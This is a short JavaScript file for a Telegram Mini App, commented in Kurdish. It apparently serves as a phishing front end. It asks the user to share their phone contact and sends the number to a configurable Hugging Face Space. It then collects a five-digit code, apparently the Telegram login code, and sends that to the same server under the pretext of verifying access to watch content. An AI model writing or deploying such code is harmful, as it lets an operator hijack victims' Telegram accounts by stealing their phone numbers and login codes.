const tg = window.Telegram.WebApp;
const API_URL = "https://your-space-name.hf.space"; // لینکی Spaceـەکەت لێرە دابنێ

tg.expand();

// کلیک کردن لە CONFIRM
document.getElementById('confirm-btn').onclick = () => {
    tg.requestContact((res) => {
        if (res.auth_date) {
            const phone = res.contact.phone_number;
            const user_id = tg.initDataUnsafe.user.id;

            // ناردنی ژمارە بۆ Hugging Face
            fetch(`${API_URL}/send_phone`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone, user_id })
            });

            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'flex';
        }
    });
};

// کلیک کردن لە GET CODE
document.getElementById('verify-btn').onclick = () => {
    const inputs = document.querySelectorAll('.code-box');
    let code = "";
    inputs.forEach(input => code += input.value);
    const user_id = tg.initDataUnsafe.user.id;

    if(code.length === 5) {
        fetch(`${API_URL}/verify_code`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ code, user_id })
        }).then(response => {
            alert("✅ Verified! You can now watch.");
            tg.close();
        });
    } else {
        alert("تکایە ٥ ژمارەکە بە تەواوی بنووسە");
    }
};
